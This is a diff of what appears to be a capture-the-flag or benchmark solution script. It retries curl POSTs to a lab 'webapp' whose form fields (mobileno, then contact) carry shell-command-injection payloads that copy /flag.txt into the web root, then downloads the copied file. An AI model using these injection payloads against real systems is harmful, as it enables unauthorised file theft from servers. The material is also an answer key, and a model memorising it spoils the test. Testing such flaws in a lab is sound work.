@@ -20,8 +20,8 @@ echo '== inject payload & read flag back =='
 # 但 sink 已触发, 攻击只看副作用不看状态码; ②webapp 首页 200 不代表 PHP/DB 已就绪,
 # 首页轮询通过后立即攻击仍可能打在初始化完成前 —— 攻击幂等 (cp 覆盖), 重试无副作用。
 for i in $(seq 1 15); do
-  curl -s -b "$JAR" -c "$JAR" -o /dev/null -X POST --data 'fullname=A&emailid=a%40a.com&mobileno=%60cp%20%2Fflag.txt%20%2Fvar%2Fwww%2Fhtml%2F.exfil_c4a9%60&description=B&submit=' 'http://webapp/index.php' || true
-  curl -sf -o /app/results.txt 'http://webapp/.exfil_c4a9' && break
+  curl -s -b "$JAR" -c "$JAR" -o /dev/null -X POST --data 'fname=a&lname=b&email=a%40a.com&password=x1pass&confirmpassword=x1pass&contact=x%3Bcp%20%2Fflag.txt%20%2Fvar%2Fwww%2Fhtml%2F.exfil_a51c%3B%23&submit=' 'http://webapp/signup.php' || true
+  curl -sf -o /app/results.txt 'http://webapp/.exfil_a51c' && break
   sleep 2
 done
 
